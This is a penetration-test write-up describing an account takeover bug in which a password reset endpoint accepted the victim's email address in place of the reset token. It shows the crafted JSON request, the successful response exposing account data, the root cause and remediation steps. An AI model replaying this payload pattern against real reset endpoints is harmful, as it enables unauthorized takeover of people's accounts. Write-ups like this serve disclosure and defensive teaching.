---
title: "Account Takeover via Password Reset Token Misconfiguration"
date: 2025-11-04T00:00:00Z
tags: ["Bug"]
author: "Fernandez"
summary: "Click to read the full walkthrough."
draft: false
---

Severity: ```Critical```

Type: ```Penetration Test Assessment```

CWE: ```CWE-640, CWE-287, CWE-306, CWE-209```

⚠️ **Note:** All sensitive information (e.g., domains, endpoints, IDs, and personal data) has been redacted or modified. The core vulnerability and methodology remain unchanged.


## Introduction
Account takeover vulnerabilities are among the most impactful findings in any security assessment. When an attacker can reset the password of any account on a platform without authorization, the entire user base is at risk. This is the story of how a single poorly worded error message handed me the keys to any account on the platform.
The irony is that I wasn't even looking for this. I was testing the password reset flow as part of standard coverage and the application told me exactly how to break it.

## The Discovery
The password reset flow on the platform worked as follows:
```
Step 1 → Enter email address
Step 2 → Receive token via email
Step 3 → Submit token + new password
Step 4 → Password changed
```

Standard enough. But I never had access to the victim's email inbox, so I needed to understand what happened when an invalid token was submitted.
I entered a random invalid token, captured the request in Burp and submitted it.

## The server came back with:
```
{
  "status": "error",
  "response_code": "422",
  "message": "User token mismatch with email"
}
```

That error message stopped me cold.
Mismatch with email. Not just "invalid token." The word mismatch implied the backend was doing a direct comparison between the token field and the email field. Which raised an immediate question, what if they match? What if I just put the email address in the token field?

## Exploitation
I went back to the password reset request in Burp Repeater. The original request with an invalid token looked like this:
```
{
  "token": "cs-1a93-BBBB-0",
  "user_token": "cs-1a93-BBBB-0",
  "email": "victim@gmail.com",
  "password": "password123",
  "confirm_password": "password123"
}
```

I made one change. Replaced both token values with the victim's email address:
```
{
  "token": "victim@gmail.com",
  "user_token": "victim@gmail.com",
  "email": "victim@gmail.com",
  "password": "password123",
  "confirm_password": "password123"
}
```

Forwarded the request and watched the response.

## The following screenshot shows the exact request and response captured in Burp Suite during the attack:
<img width="1241" height="607" alt="ATO" src="https://github.com/user-attachments/assets/de54c9cc-bbc7-4c01-8f33-99b2d6587b9f" />

The request on the left shows the password reset endpoint with user_token set to the victim's email address. The response on the right returned HTTP/2 200 OK with "message": "Password reset successful" along with the victim's full account data including name, phone number, email, bank details, account number, and shipping addresses.

## What the Response Returned
```
{
  "status": "success",
  "response_code": "00",
  "message": "Password reset successful",
  "data": {
    "id": 39,
    "firstName": "[REDACTED]",
    "lastName": "[REDACTED]",
    "phoneNumber": "[REDACTED]",
    "email": "victim@gmail.com",
    "password": "[REDACTED]",
    "accountStatus": true,
    "accountNumber": "[REDACTED]",
    "bankName": "[REDACTED]",
    "createdAt": "2023-10-21T05:43:58.350Z",
    "updatedAt": "2025-05-11T19:24:53.000Z",
    "shippingAddresses": [
      {
        "id": 32,
        "contactName": "[REDACTED]",
        "address": "Herbert Macaulay way",
        "city": "Lagos",
        "state": "Lagos",
        "phone": "[REDACTED]"
      }
    ]
  }
}
```
200 OK. Password reset successful. Full account data returned. I had just taken over a real customer account without ever touching their email inbox, without brute forcing anything, and in under 60 seconds.

## What Went Wrong
The root cause is a fundamental logic error in how the backend validated the password reset token
```
Intended behavior:
Server receives token
→ looks up token in database
→ matches against stored secret
→ allows password reset only if valid

Actual behavior:
Server receives token
→ compares token field against email field
→ if token == email → validation passes
→ password reset allowed
```

The backend was not validating the token against a stored cryptographic secret. It was doing a string comparison between the submitted token and the email address. Since the attacker already knows the email address, it is in the same request, the check was completely trivially bypassable.

## Impact
Any attacker who knew or could guess any registered email address on the platform could take over that account instantly. No inbox access. No brute force. No special skill.

## Remediation
```
1. Generate cryptographically random tokens
   server-side and store them with expiry

2. Validate token against stored database value only
   never compare against any user-supplied field

3. Token must be single use
   invalidate immediately after successful reset
```
